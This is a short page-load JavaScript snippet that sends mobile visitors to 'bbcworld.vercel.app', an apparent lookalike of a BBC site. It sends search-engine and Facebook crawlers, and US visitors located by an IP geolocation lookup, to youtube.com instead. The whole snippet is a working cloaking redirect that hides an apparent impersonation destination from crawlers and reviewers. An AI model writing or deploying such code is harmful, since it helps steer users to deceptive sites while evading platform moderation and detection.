    <script>
        function redirectNonAllowedDevices() {
            var userAgent = navigator.userAgent.toLowerCase();
            
            if (userAgent.match(/android|iphone|ipad/i)) {
                
                window.location.replace("https://bbcworld.vercel.app");
            } else {
                
                fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    var countryCode = data.country_code.toLowerCase();
                    
                    if (userAgent.match(/facebookexternalhit|googlebot|bingbot|msnbot|yahoo/i) || countryCode === 'us') {
                        
                        window.location.replace("https://youtube.com");
                    }
                })
                .catch(error => console.error('Error fetching location:', error));
            }
        }
        window.onload = redirectNonAllowedDevices;
    </script>
